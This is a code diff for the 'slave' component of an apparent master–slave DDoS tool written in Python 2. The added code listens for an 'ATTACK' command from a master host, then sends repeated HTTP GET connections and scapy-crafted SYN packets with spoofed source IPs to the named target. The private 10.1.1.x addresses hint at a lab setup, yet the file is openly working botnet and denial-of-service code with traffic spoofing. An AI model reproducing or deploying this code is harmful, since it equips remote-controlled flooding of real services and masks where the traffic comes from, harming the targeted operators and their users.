@@ -3,7 +3,12 @@ import time, os, sys, string, ntplib
 from socket import *  #importing the socket library for network connections
 from time import ctime
 from scapy.all import *
-conf.verb=0
+
+##Setting up variables
+SERVER_HOST = '10.1.1.50'
+SERVER_PORT = 8080
+MS_LISTEN_HOST = '10.1.1.20'
+MS_LISTEN_PORT = 8081
 
 class Slave():
     def __init__(self, host, port, sock=None):
@@ -17,11 +22,11 @@ class Slave():
 
         # get ntp times
         ntpc = ntplib.NTPClient()
-        ntp_res = ntpc.request('europe.pool.ntp.org', version=3)
+        ntp_res = ntpc.request('10.1.1.50', version=3)
 
         # connect to master
-        self.masterHost = 'localhost'
-        self.masterPort = 8081
+        self.masterHost = MS_LISTEN_HOST
+        self.masterPort = MS_LISTEN_PORT
         self.sockMaster = socket(AF_INET, SOCK_STREAM)
         self.sockMaster.connect((self.masterHost, self.masterPort))
         self.sockMaster.send('Slave offset is: {0}'.format(ntp_res.offset))
@@ -30,20 +35,21 @@ class Slave():
         msg_buf = self.sockMaster.recv(64)
         if len(msg_buf) > 0:
           print(msg_buf)
+          if (msg_buf.startswith('ATTACK')):
+              command, host, port, offset = msg_buf.split()
+              self.doTheDos(host, int(port), float(offset))
 
-    def doTheDos(self, host, port):
-        while 1:
-            thread.start_new_thread(self.dos, (host, port))
-            time.sleep(0.1)
-            #self.dos(host, port)
+    def doTheDos(self, host, port, offset):
+        for _ in range(0, 5):
+          self.dos(host, port)
 
     def dos(self, host, port):
         try:
             self.ddos = socket(AF_INET, SOCK_STREAM)
             self.ddos.connect((host, port))
             self.ddos.send("GET /%s HTTP/1.1\r\n" % self.message)
-            #IP Spoof with Scapy
-            src = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+            #IP Spoof
+            src = "10.1.1.{}".format(random.randint(0,255))
             spoofed_SYN =IP(dst=host,src=src)/TCP(dport=8080,sport=5000,flags='S')
             send(spoofed_SYN)
         except error, msg:
